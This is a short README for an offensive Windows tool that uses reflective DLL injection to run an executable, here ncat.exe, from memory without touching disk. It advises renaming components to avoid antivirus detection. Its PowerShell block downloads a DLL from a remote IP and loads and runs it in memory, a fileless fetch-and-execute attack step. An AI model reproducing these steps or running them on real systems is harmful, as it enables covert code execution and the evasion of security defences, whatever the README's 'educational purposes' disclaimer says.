## Reflective DLL Injection Template

This program demontrates a three-part Windows exploit to load and execute an executable from memory, without ever touching disk.

For this to execute properly:
1. Host a web server containing the compiled DLL (names of everything should be changed to avoid AV detection)
2. Set up an SMB server containing the executable you want to run (here, `ncat.exe`)
3. Execute the following commands in a Powershell session:

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.16.1/ReflectiveDllInjection.dll')
$assembly = [System.Reflection.Assembly]::Load($data)
[ReflectiveDllInjection.ReflectiveDllInjection]::Main()
```

## Usage

This project is create for educational and demonstration purposes only. I'm not liable for how you use it.